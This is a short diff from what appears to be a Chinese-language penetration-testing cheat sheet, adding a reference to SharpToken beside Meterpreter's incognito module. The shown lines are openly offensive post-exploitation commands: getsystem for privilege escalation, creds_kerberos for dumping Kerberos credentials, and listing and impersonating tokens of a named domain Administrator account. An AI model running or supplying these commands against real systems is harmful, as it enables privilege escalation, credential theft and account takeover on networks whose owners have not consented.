@@ -225,7 +225,7 @@ meterpreter > getsystem
 meterpreter > creds_kerberos
 
 # msf incognito https://mp.weixin.qq.com/s/iPv5sT50orqW79SmbVaFEQ
-use incognito      //进入incognito模块
+use incognito      //进入incognito模块 或用 SharpToken
 list_tokens -u    //列出令牌
 impersonate_token "WUHANKQ\Administrator"    //选择要窃取的账号
 #验证权限
